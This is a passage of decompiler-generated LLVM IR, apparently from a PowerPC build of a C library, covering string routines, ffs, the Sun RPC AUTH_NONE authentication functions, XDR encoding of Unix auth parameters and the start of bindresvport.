  store i1 %v3_100158dc, i1* %cr7_eq.global-to-local, align 1
  %v4_100158e0 = inttoptr i32 %v1_100158d4 to i8*
  store i8 %v2_100158d0, i8* %v4_100158e0, align 1
  %v0_100158e4 = load i32, i32* @r4, align 4
  %v1_100158e4 = add i32 %v0_100158e4, 1
  store i32 %v1_100158e4, i32* %r11.global-to-local, align 4
  %v0_100158e8 = load i32, i32* @lr, align 4
  %v1_100158e8 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_100158e8, i32 %v0_100158e8)
  %v0_100158ec = load i32, i32* @r4, align 4
  %v1_100158ec = add i32 %v0_100158ec, 1
  %v2_100158ec = inttoptr i32 %v1_100158ec to i8*
  %v3_100158ec = load i8, i8* %v2_100158ec, align 1
  %v0_100158f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100158f0 = add i32 %v0_100158f0, 1
  store i32 %v1_100158f0, i32* @r8, align 4
  %v0_100158f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100158f4 = add i32 %v0_100158f4, 1
  store i32 %v1_100158f4, i32* @r10, align 4
  %v3_100158f8 = icmp eq i8 %v3_100158ec, 0
  store i1 %v3_100158f8, i1* %cr7_eq.global-to-local, align 1
  %v2_100158fc = load i32, i32* %r9.global-to-local, align 4
  %v3_100158fc = add i32 %v2_100158fc, 1
  %v4_100158fc = inttoptr i32 %v3_100158fc to i8*
  store i8 %v3_100158ec, i8* %v4_100158fc, align 1
  %v0_10015900 = load i32, i32* @r8, align 4
  %v1_10015900 = add i32 %v0_10015900, 1
  store i32 %v1_10015900, i32* %r9.global-to-local, align 4
  %v1_10015904 = add i32 %v0_10015900, 2
  store i32 %v1_10015904, i32* @r4, align 4
  %v0_10015908 = load i32, i32* @lr, align 4
  %v1_10015908 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10015908, i32 %v0_10015908)
  %v0_1001590c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001590c = add i32 %v0_1001590c, 1
  %v2_1001590c = inttoptr i32 %v1_1001590c to i8*
  %v3_1001590c = load i8, i8* %v2_1001590c, align 1
  %v0_10015910 = load i32, i32* @r10, align 4
  %v1_10015910 = add i32 %v0_10015910, 1
  store i32 %v1_10015910, i32* %r11.global-to-local, align 4
  %v3_10015914 = icmp eq i8 %v3_1001590c, 0
  store i1 %v3_10015914, i1* %cr7_eq.global-to-local, align 1
  %v2_10015918 = load i32, i32* %r7.global-to-local, align 4
  %v3_10015918 = add i32 %v2_10015918, 1
  %v4_10015918 = inttoptr i32 %v3_10015918 to i8*
  store i8 %v3_1001590c, i8* %v4_10015918, align 1
  %v0_1001591c = load i32, i32* @lr, align 4
  %v1_1001591c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001591c, i32 %v0_1001591c)
  %v0_10015920 = load i32, i32* @r8, align 4
  %v1_10015920 = add i32 %v0_10015920, 1
  %v2_10015920 = inttoptr i32 %v1_10015920 to i8*
  %v3_10015920 = load i8, i8* %v2_10015920, align 1
  %v4_10015920 = zext i8 %v3_10015920 to i32
  store i32 %v4_10015920, i32* %r9.global-to-local, align 4
  %v3_10015924 = icmp eq i8 %v3_10015920, 0
  store i1 %v3_10015924, i1* %cr7_eq.global-to-local, align 1
  %v2_10015928 = load i32, i32* @r10, align 4
  %v3_10015928 = add i32 %v2_10015928, 1
  %v4_10015928 = inttoptr i32 %v3_10015928 to i8*
  store i8 %v3_10015920, i8* %v4_10015928, align 1
  %v0_1001592c = load i32, i32* @lr, align 4
  %v1_1001592c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1001592c, i32 %v0_1001592c)
  %v0_10015930 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10015930 = add i32 %v0_10015930, -1
  store i32 %v1_10015930, i32* %ctr.global-to-local, align 4
  %v2_10015930 = icmp eq i32 %v1_10015930, 0
  br i1 %v2_10015930, label %dec_label_pc_10015934, label %dec_label_pc_100158d0.dec_label_pc_100158d0_crit_edge

dec_label_pc_100158d0.dec_label_pc_100158d0_crit_edge: ; preds = %dec_label_pc_100158d0
  %v0_100158d4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100158d0

dec_label_pc_10015934:                            ; preds = %dec_label_pc_100158d0
  %v0_10015934 = load i32, i32* %r5.global-to-local, align 4
  %v1_10015934 = urem i32 %v0_10015934, 4
  store i32 %v1_10015934, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10015958

dec_label_pc_1001593c:                            ; preds = %dec_label_pc_10015958, %dec_label_pc_1001593c.dec_label_pc_1001593c_crit_edge
  %v0_10015940 = phi i32 [ %v0_10015940.pre, %dec_label_pc_1001593c.dec_label_pc_1001593c_crit_edge ], [ %v0_10015958, %dec_label_pc_10015958 ]
  %v0_1001593c = load i32, i32* @r4, align 4
  %v1_1001593c = inttoptr i32 %v0_1001593c to i8*
  %v2_1001593c = load i8, i8* %v1_1001593c, align 1
  %v3_1001593c = zext i8 %v2_1001593c to i32
  store i32 %v3_1001593c, i32* %r9.global-to-local, align 4
  %v1_10015940 = add i32 %v0_10015940, -1
  store i32 %v1_10015940, i32* %r5.global-to-local, align 4
  %v1_10015944 = add i32 %v0_1001593c, 1
  store i32 %v1_10015944, i32* @r4, align 4
  %v3_10015948 = icmp eq i8 %v2_1001593c, 0
  store i1 %v3_10015948, i1* %cr7_eq.global-to-local, align 1
  %v2_1001594c = load i32, i32* %r11.global-to-local, align 4
  %v3_1001594c = add i32 %v2_1001594c, 1
  %v4_1001594c = inttoptr i32 %v3_1001594c to i8*
  store i8 %v2_1001593c, i8* %v4_1001594c, align 1
  store i32 %v3_1001594c, i32* %r11.global-to-local, align 4
  %v0_10015950 = load i32, i32* @lr, align 4
  %v1_10015950 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10015950, i32 %v0_10015950)
  %v0_10015960 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10015960 = add i32 %v0_10015960, -1
  store i32 %v1_10015960, i32* %ctr.global-to-local, align 4
  %v2_10015960 = icmp eq i32 %v1_10015960, 0
  br i1 %v2_10015960, label %dec_label_pc_10015964, label %dec_label_pc_1001593c.dec_label_pc_1001593c_crit_edge

dec_label_pc_1001593c.dec_label_pc_1001593c_crit_edge: ; preds = %dec_label_pc_1001593c
  %v0_10015940.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001593c

dec_label_pc_10015958:                            ; preds = %dec_label_pc_100158b8, %dec_label_pc_10015934
  %v0_10015958 = phi i32 [ %arg2, %dec_label_pc_100158b8 ], [ %v1_10015934, %dec_label_pc_10015934 ]
  store i32 %v0_10015958, i32* %ctr.global-to-local, align 4
  %v2_100159603 = icmp eq i32 %v0_10015958, 0
  br i1 %v2_100159603, label %dec_label_pc_10015964, label %dec_label_pc_1001593c

dec_label_pc_10015964:                            ; preds = %dec_label_pc_1001593c, %dec_label_pc_10015958
  %v0_10015964 = load i32, i32* %r9.global-to-local, align 4
  %v3_10015964 = icmp eq i32 %v0_10015964, 0
  store i1 %v3_10015964, i1* %cr7_eq.global-to-local, align 1
  %v0_10015968 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10015964, i32 %v0_10015968)
  %v0_1001596c = load i32, i32* %r5.global-to-local, align 4
  %v1_1001596c = trunc i32 %v0_1001596c to i8
  %v2_1001596c = load i32, i32* %r11.global-to-local, align 4
  %v3_1001596c = add i32 %v2_1001596c, 1
  %v4_1001596c = inttoptr i32 %v3_1001596c to i8*
  store i8 %v1_1001596c, i8* %v4_1001596c, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_10015958, { 1, 2, 0 }
  uselistorder i32 %v1_10015960, { 1, 0 }
  uselistorder i32 %v1_10015934, { 1, 0 }
  uselistorder i32 %v1_10015930, { 1, 0 }
  uselistorder i32 %v2_100158e0, { 1, 0 }
  uselistorder i32 %v1_100158ac, { 1, 0 }
  uselistorder i32 %v0_100158a8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 6, 0, 7, 1, 2, 4, 3, 5, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10015964, { 1, 0 }
  uselistorder label %dec_label_pc_10015958, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100159a41 = load i32, i32* @r3, align 4
  %v1_100159a42 = inttoptr i32 %v0_100159a41 to i8*
  %v2_100159a43 = load i8, i8* %v1_100159a42, align 1
  %v3_100159a86 = icmp eq i8 %v2_100159a43, 0
  br i1 %v3_100159a86, label %dec_label_pc_100159b8, label %dec_label_pc_100159b0

dec_label_pc_10015980:                            ; preds = %dec_label_pc_10015980, %dec_label_pc_100159b0
  %v0_10015980 = phi i32 [ %v1_10015984, %dec_label_pc_10015980 ], [ %tmp, %dec_label_pc_100159b0 ]
  %v1_10015980 = inttoptr i32 %v0_10015980 to i8*
  %v2_10015980 = load i8, i8* %v1_10015980, align 1
  %v1_10015984 = add i32 %v0_10015980, 1
  %v3_10015988 = icmp eq i8 %v2_10015980, 0
  %v4_1001598c = icmp eq i8 %v0_1001598c8.in, %v2_10015980
  %brmerge = or i1 %v3_10015988, %v4_1001598c
  br i1 %brmerge, label %dec_label_pc_10015994, label %dec_label_pc_10015980

dec_label_pc_10015994:                            ; preds = %dec_label_pc_10015980
  br i1 %v3_10015988, label %dec_label_pc_100159b8, label %dec_label_pc_1001599c

dec_label_pc_1001599c:                            ; preds = %dec_label_pc_10015994
  %v1_1001599c = add i32 %v0_1001599c, 1
  %v1_100159a0 = add i32 %v0_100159a0, 1
  %v1_100159a4 = inttoptr i32 %v1_100159a0 to i8*
  %v2_100159a4 = load i8, i8* %v1_100159a4, align 1
  %v3_100159a8 = icmp eq i8 %v2_100159a4, 0
  br i1 %v3_100159a8, label %dec_label_pc_100159b8, label %dec_label_pc_100159b0

dec_label_pc_100159b0:                            ; preds = %entry, %dec_label_pc_1001599c
  %v0_100159a0 = phi i32 [ %v1_100159a0, %dec_label_pc_1001599c ], [ %v0_100159a41, %entry ]
  %v0_1001599c = phi i32 [ %v1_1001599c, %dec_label_pc_1001599c ], [ 0, %entry ]
  %v0_1001598c8.in = phi i8 [ %v2_100159a4, %dec_label_pc_1001599c ], [ %v2_100159a43, %entry ]
  br label %dec_label_pc_10015980

dec_label_pc_100159b8:                            ; preds = %dec_label_pc_1001599c, %dec_label_pc_10015994, %entry
  %v0_100159b8 = phi i32 [ 0, %entry ], [ %v1_1001599c, %dec_label_pc_1001599c ], [ %v0_1001599c, %dec_label_pc_10015994 ]
  ret i32 %v0_100159b8

; uselistorder directives
  uselistorder i32 %v0_10015980, { 1, 0 }
  uselistorder label %dec_label_pc_100159b0, { 1, 0 }
  uselistorder label %dec_label_pc_10015980, { 1, 0 }
}

define i32 @ffs(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100159c0 = urem i32 %arg1, 65536
  %v3_100159c8 = icmp eq i32 %v1_100159c0, 0
  br i1 %v3_100159c8, label %dec_label_pc_100159d0, label %dec_label_pc_100159d8

dec_label_pc_100159d0:                            ; preds = %entry
  %v4_100159d0 = sdiv i32 %arg1, 65536
  br label %dec_label_pc_100159d8

dec_label_pc_100159d8:                            ; preds = %entry, %dec_label_pc_100159d0
  %v0_100159e8 = phi i32 [ %arg1, %entry ], [ %v4_100159d0, %dec_label_pc_100159d0 ]
  %v0_100159e4 = phi i32 [ 1, %entry ], [ 17, %dec_label_pc_100159d0 ]
  %v1_100159d8 = urem i32 %v0_100159e8, 256
  %v3_100159dc = icmp eq i32 %v1_100159d8, 0
  br i1 %v3_100159dc, label %dec_label_pc_100159e4, label %dec_label_pc_100159f0

dec_label_pc_100159e4:                            ; preds = %dec_label_pc_100159d8
  %v1_100159e4 = or i32 %v0_100159e4, 8
  %v4_100159e8 = sdiv i32 %v0_100159e8, 256
  br label %dec_label_pc_100159f0

dec_label_pc_100159f0:                            ; preds = %dec_label_pc_100159d8, %dec_label_pc_100159e4
  %v0_100159f8 = phi i32 [ %v0_100159e4, %dec_label_pc_100159d8 ], [ %v1_100159e4, %dec_label_pc_100159e4 ]
  %v0_100159fc = phi i32 [ %v0_100159e8, %dec_label_pc_100159d8 ], [ %v4_100159e8, %dec_label_pc_100159e4 ]
  %v1_100159f0 = urem i32 %v0_100159fc, 16
  %v3_100159f0 = icmp eq i32 %v1_100159f0, 0
  br i1 %v3_100159f0, label %dec_label_pc_100159f8, label %dec_label_pc_10015a04

dec_label_pc_100159f8:                            ; preds = %dec_label_pc_100159f0
  %v1_100159f8 = add nsw i32 %v0_100159f8, 4
  %v4_100159fc = sdiv i32 %v0_100159fc, 16
  %v1_10015a00 = urem i32 %v1_100159f8, 256
  br label %dec_label_pc_10015a04

dec_label_pc_10015a04:                            ; preds = %dec_label_pc_100159f0, %dec_label_pc_100159f8
  %v0_10015a0c = phi i32 [ %v0_100159f8, %dec_label_pc_100159f0 ], [ %v1_10015a00, %dec_label_pc_100159f8 ]
  %v0_10015a10 = phi i32 [ %v0_100159fc, %dec_label_pc_100159f0 ], [ %v4_100159fc, %dec_label_pc_100159f8 ]
  %v1_10015a04 = urem i32 %v0_10015a10, 4
  %v3_10015a04 = icmp eq i32 %v1_10015a04, 0
  br i1 %v3_10015a04, label %dec_label_pc_10015a0c, label %dec_label_pc_10015a18

dec_label_pc_10015a0c:                            ; preds = %dec_label_pc_10015a04
  %v1_10015a0c = add nsw i32 %v0_10015a0c, 2
  %v4_10015a10 = sdiv i32 %v0_10015a10, 4
  %v1_10015a14 = urem i32 %v1_10015a0c, 256
  br label %dec_label_pc_10015a18

dec_label_pc_10015a18:                            ; preds = %dec_label_pc_10015a04, %dec_label_pc_10015a0c
  %v0_10015a2c = phi i32 [ %v1_10015a14, %dec_label_pc_10015a0c ], [ %v0_10015a0c, %dec_label_pc_10015a04 ]
  %v0_10015a24 = phi i32 [ %v4_10015a10, %dec_label_pc_10015a0c ], [ %v0_10015a10, %dec_label_pc_10015a04 ]
  %v3_10015a18 = icmp eq i32 %v0_10015a24, 0
  br i1 %v3_10015a18, label %dec_label_pc_10015a30, label %dec_label_pc_10015a24

dec_label_pc_10015a24:                            ; preds = %dec_label_pc_10015a18
  %v1_10015a24 = urem i32 %v0_10015a24, 2
  %v1_10015a28 = xor i32 %v1_10015a24, 1
  %v2_10015a2c = add nsw i32 %v1_10015a28, %v0_10015a2c
  br label %dec_label_pc_10015a30

dec_label_pc_10015a30:                            ; preds = %dec_label_pc_10015a18, %dec_label_pc_10015a24
  %storemerge = phi i32 [ %v2_10015a2c, %dec_label_pc_10015a24 ], [ 0, %dec_label_pc_10015a18 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10015a10, { 2, 0, 1 }
  uselistorder i32 %v0_100159fc, { 2, 0, 1 }
  uselistorder i32 %v0_100159e4, { 1, 0 }
  uselistorder i32 %v0_100159e8, { 2, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10015a30, { 1, 0 }
  uselistorder label %dec_label_pc_10015a18, { 1, 0 }
  uselistorder label %dec_label_pc_10015a04, { 1, 0 }
  uselistorder label %dec_label_pc_100159f0, { 1, 0 }
  uselistorder label %dec_label_pc_100159d8, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_10015a38 = load i32, i32* @r3, align 4
  ret i32 %v0_10015a38
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_10015a4c = load i32, i32* @r3, align 4
  ret i32 %v0_10015a4c
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268524136, i32* @lr, align 4
  %v0_10015a64 = call i32 @__rpc_thread_variables()
  store i32 %v0_10015a64, i32* %r3.global-to-local, align 4
  %v1_10015a68 = add i32 %v0_10015a64, 152
  %v2_10015a68 = inttoptr i32 %v1_10015a68 to i32*
  %v3_10015a68 = load i32, i32* %v2_10015a68, align 4
  %v0_10015a70 = load i32, i32* @r31, align 4
  store i32 %v0_10015a70, i32* %r3.global-to-local, align 4
  %v3_10015a74 = icmp eq i32 %v3_10015a68, 0
  br i1 %v3_10015a74, label %dec_label_pc_10015a98, label %dec_label_pc_10015a80

dec_label_pc_10015a80:                            ; preds = %entry
  %v1_10015a80 = add i32 %v0_10015a70, 4
  %v2_10015a80 = inttoptr i32 %v1_10015a80 to i32*
  %v3_10015a80 = load i32, i32* %v2_10015a80, align 4
  %v1_10015a88 = add i32 %v3_10015a80, 12
  %v2_10015a88 = inttoptr i32 %v1_10015a88 to i32*
  %v3_10015a88 = load i32, i32* %v2_10015a88, align 4
  call void @__pseudo_call(i32 %v3_10015a88)
  %v0_10015a94 = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10015a98

dec_label_pc_10015a98:                            ; preds = %entry, %dec_label_pc_10015a80
  %v0_10015a98 = phi i32 [ 0, %entry ], [ %v0_10015a94, %dec_label_pc_10015a80 ]
  store i32 %v0_10015a98, i32* %r3.global-to-local, align 4
  ret i32 %v0_10015a98

; uselistorder directives
  uselistorder i32 %v0_10015a98, { 1, 0 }
  uselistorder label %dec_label_pc_10015a98, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  store i32 268524228, i32* @lr, align 4
  %v0_10015ac0 = call i32 @__rpc_thread_variables()
  %v1_10015ac4 = add i32 %v0_10015ac0, 152
  %v2_10015ac4 = inttoptr i32 %v1_10015ac4 to i32*
  %v3_10015ac4 = load i32, i32* %v2_10015ac4, align 4
  store i32 %v3_10015ac4, i32* @r31, align 4
  %v3_10015ad4 = icmp eq i32 %v3_10015ac4, 0
  br i1 %v3_10015ad4, label %dec_label_pc_10015adc, label %dec_label_pc_10015af0

dec_label_pc_10015adc:                            ; preds = %entry
  store i32 268524256, i32* @lr, align 4
  %v2_10015adc = call i32 @calloc(i32 1, i32 64)
  store i32 %v2_10015adc, i32* @r31, align 4
  %v3_10015ae0 = icmp eq i32 %v2_10015adc, 0
  br i1 %v3_10015ae0, label %dec_label_pc_10015b8c, label %dec_label_pc_10015aec

dec_label_pc_10015aec:                            ; preds = %dec_label_pc_10015adc
  %v1_10015aec = load i32, i32* @r30, align 4
  %v2_10015aec = add i32 %v1_10015aec, 152
  %v3_10015aec = inttoptr i32 %v2_10015aec to i32*
  store i32 %v2_10015adc, i32* %v3_10015aec, align 4
  %v0_10015af0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015af0

dec_label_pc_10015af0:                            ; preds = %entry, %dec_label_pc_10015aec
  %v1_10015b24 = phi i32 [ %v3_10015ac4, %entry ], [ %v0_10015af0.pre, %dec_label_pc_10015aec ]
  %v1_10015af0 = add i32 %v1_10015b24, 60
  %v2_10015af0 = inttoptr i32 %v1_10015af0 to i32*
  %v3_10015af0 = load i32, i32* %v2_10015af0, align 4
  %v2_10015af4 = ptrtoint i32* %stack_var_-56 to i32
  %v1_10015af8 = add i32 %v1_10015b24, 12
  store i32 %v1_10015af8, i32* @r30, align 4
  %v3_10015b00 = icmp eq i32 %v3_10015af0, 0
  br i1 %v3_10015b00, label %dec_label_pc_10015b0c, label %dec_label_pc_10015b88

dec_label_pc_10015b0c:                            ; preds = %dec_label_pc_10015af0
  %v1_10015b04 = add i32 %v1_10015b24, 40
  %v2_10015b24 = add i32 %v1_10015b24, 32
  %v3_10015b24 = inttoptr i32 %v2_10015b24 to i32*
  store i32 ptrtoint (i32* @global_var_1001a0ec.577 to i32), i32* %v3_10015b24, align 4
  %v5_10015b38 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v1_10015b04, i32 20, i32 0)
  %v0_10015b3c = load i32, i32* @r31, align 4
  store i32 %v0_10015b3c, i32* @r4, align 4
  store i32 %v2_10015af4, i32* @r3, align 4
  store i32 268524360, i32* @lr, align 4
  %v0_10015b44 = call i32 @xdr_opaque_auth()
  %v0_10015b48 = load i32, i32* @r30, align 4
  store i32 %v0_10015b48, i32* @r4, align 4
  store i32 %v2_10015af4, i32* @r3, align 4
  store i32 268524372, i32* @lr, align 4
  %v0_10015b50 = call i32 @xdr_opaque_auth()
  %v1_10015b5c = add i32 %tmp, 16
  %v2_10015b5c = inttoptr i32 %v1_10015b5c to i32*
  %v3_10015b5c = load i32, i32* %v2_10015b5c, align 4
  call void @__pseudo_call(i32 %v3_10015b5c)
  %v1_10015b68 = load i32, i32* @r31, align 4
  %v2_10015b68 = add i32 %v1_10015b68, 60
  %v3_10015b68 = inttoptr i32 %v2_10015b68 to i32*
  store i32 %v2_10015af4, i32* %v3_10015b68, align 4
  %v1_10015b74 = add i32 %tmp, 28
  %v2_10015b74 = inttoptr i32 %v1_10015b74 to i32*
  %v3_10015b74 = load i32, i32* %v2_10015b74, align 4
  %v3_10015b78 = icmp eq i32 %v3_10015b74, 0
  br i1 %v3_10015b78, label %dec_label_pc_10015b88, label %dec_label_pc_10015b80

dec_label_pc_10015b80:                            ; preds = %dec_label_pc_10015b0c
  call void @__pseudo_call(i32 %v3_10015b74)
  br label %dec_label_pc_10015b88

dec_label_pc_10015b88:                            ; preds = %dec_label_pc_10015af0, %dec_label_pc_10015b0c, %dec_label_pc_10015b80
  %v0_10015b88 = load i32, i32* @r31, align 4
  br label %dec_label_pc_10015b8c

dec_label_pc_10015b8c:                            ; preds = %dec_label_pc_10015adc, %dec_label_pc_10015b88
  %v0_10015b9c = phi i32 [ 0, %dec_label_pc_10015adc ], [ %v0_10015b88, %dec_label_pc_10015b88 ]
  ret i32 %v0_10015b9c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32)* @calloc, { 1, 3, 0, 2 }
  uselistorder i32 64, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 33, 37, 38, 8, 39, 9, 10, 11, 34, 35, 44, 36, 16, 51, 32, 17, 40, 18, 19, 20, 21, 22, 23, 24, 14, 46, 47, 49, 48, 41, 42, 25, 26, 43, 27, 50, 28, 29, 30, 31, 45, 15, 13 }
  uselistorder i32 152, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10015b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10015b88, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10015af0, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268524476, i32* @lr, align 4
  %v0_10015bb8 = call i32 @xdr_u_long()
  store i32 255, i32* @r5, align 4
  %v3_10015bc0 = icmp eq i32 %v0_10015bb8, 0
  %v0_10015bc4 = load i32, i32* @r31, align 4
  %v1_10015bc4 = add i32 %v0_10015bc4, 4
  store i32 %v1_10015bc4, i32* @r4, align 4
  br i1 %v3_10015bc0, label %dec_label_pc_10015c38, label %dec_label_pc_10015bd0

dec_label_pc_10015bd0:                            ; preds = %entry
  %v0_10015bc8 = load i32, i32* @r30, align 4
  store i32 268524500, i32* @lr, align 4
  %v3_10015bd0 = inttoptr i32 %v0_10015bc8 to i32*
  %v4_10015bd0 = call i32 @__GI_xdr_string(i32* %v3_10015bd0)
  %v0_10015bd4 = load i32, i32* @r31, align 4
  %v1_10015bd4 = add i32 %v0_10015bd4, 8
  store i32 %v1_10015bd4, i32* @r4, align 4
  %v3_10015bd8 = icmp eq i32 %v4_10015bd0, 0
  %v0_10015bdc = load i32, i32* @r30, align 4
  store i32 %v0_10015bdc, i32* @r3, align 4
  br i1 %v3_10015bd8, label %dec_label_pc_10015c38, label %dec_label_pc_10015be4

dec_label_pc_10015be4:                            ; preds = %dec_label_pc_10015bd0
  store i32 268524520, i32* @lr, align 4
  %v2_10015be4 = inttoptr i32 %v0_10015bdc to i32*
  %v3_10015be4 = inttoptr i32 %v1_10015bd4 to i32*
  %v4_10015be4 = call i32 @xdr_u_int(i32* %v2_10015be4, i32* %v3_10015be4)
  %v0_10015be8 = load i32, i32* @r31, align 4
  %v1_10015be8 = add i32 %v0_10015be8, 12
  store i32 %v1_10015be8, i32* @r4, align 4
  %v3_10015bec = icmp eq i32 %v4_10015be4, 0
  %v0_10015bf0 = load i32, i32* @r30, align 4
  store i32 %v0_10015bf0, i32* @r3, align 4
  br i1 %v3_10015bec, label %dec_label_pc_10015c38, label %dec_label_pc_10015bf8

dec_label_pc_10015bf8:                            ; preds = %dec_label_pc_10015be4
  store i32 ptrtoint (i32* @global_var_10015bfc.578 to i32), i32* @lr, align 4
  %v2_10015bf8 = inttoptr i32 %v0_10015bf0 to i32*
  %v3_10015bf8 = inttoptr i32 %v1_10015be8 to i32*
  %v4_10015bf8 = call i32 @xdr_u_int(i32* %v2_10015bf8, i32* %v3_10015bf8)
  %v3_10015c00 = icmp eq i32 %v4_10015bf8, 0
  %v0_10015c04 = load i32, i32* @r31, align 4
  %v0_10015c08 = load i32, i32* @r30, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 13144), i32* @r8, align 4
  br i1 %v3_10015c00, label %dec_label_pc_10015c38, label %dec_label_pc_10015c20

dec_label_pc_10015c20:                            ; preds = %dec_label_pc_10015bf8
  %v1_10015c10 = add i32 %v0_10015c04, 20
  %v1_10015c04 = add i32 %v0_10015c04, 16
  store i32 268524580, i32* @lr, align 4
  %v6_10015c20 = inttoptr i32 %v0_10015c08 to i32*
  %v7_10015c20 = call i32 @__GI_xdr_array(i32* %v6_10015c20, i32 %v1_10015c10, i32 %v1_10015c04, i32 16, i32 4, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 13144))
  %v2_10015c24 = icmp ne i32 %v7_10015c20, 0
  %v5_10015c28 = zext i1 %v2_10015c24 to i32
  br label %dec_label_pc_10015c38

dec_label_pc_10015c38:                            ; preds = %entry, %dec_label_pc_10015bd0, %dec_label_pc_10015be4, %dec_label_pc_10015bf8, %dec_label_pc_10015c20
  %storemerge = phi i32 [ %v5_10015c28, %dec_label_pc_10015c20 ], [ 0, %dec_label_pc_10015bf8 ], [ 0, %dec_label_pc_10015be4 ], [ 0, %dec_label_pc_10015bd0 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10015c04, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), { 0, 24, 1, 25, 26, 27, 28, 29, 30, 43, 31, 32, 33, 35, 34, 36, 2, 37, 3, 38, 4, 5, 44, 6, 45, 8, 9, 7, 10, 39, 11, 12, 13, 14, 15, 16, 17, 40, 20, 21, 19, 41, 18, 22, 23, 42 }
  uselistorder i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 13144), { 1, 0 }
  uselistorder i32 (i32*)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 ()* @xdr_u_long, { 9, 11, 14, 8, 7, 13, 6, 10, 2, 1, 0, 12, 5, 4, 3 }
  uselistorder label %dec_label_pc_10015c38, { 4, 3, 2, 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_10015c50 = load i32, i32* @lr, align 4
  store i32 %v0_10015c50, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v4_10015c58 = icmp eq i16* %arg2, null
  store i32 %arg1, i32* %r28.global-to-local, align 4
  br i1 %v4_10015c58, label %dec_label_pc_10015c68, label %dec_label_pc_10015c84

dec_label_pc_10015c68:                            ; preds = %entry
  %v2_10015c68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10015c68, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10015c78.579 to i32), i32* @lr, align 4
  %v3_10015c74 = call i32 @__GI_memset(i32 %v2_10015c68, i32 16, i32 16)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10015ca4

dec_label_pc_10015c84:                            ; preds = %entry
  %v2_10015c84 = load i16, i16* %arg2, align 2
  %v3_10015c84 = zext i16 %v2_10015c84 to i32
  store i32 %v3_10015c84, i32* %r0.global-to-local, align 4
  %v3_10015c88 = icmp eq i16 %v2_10015c84, 2
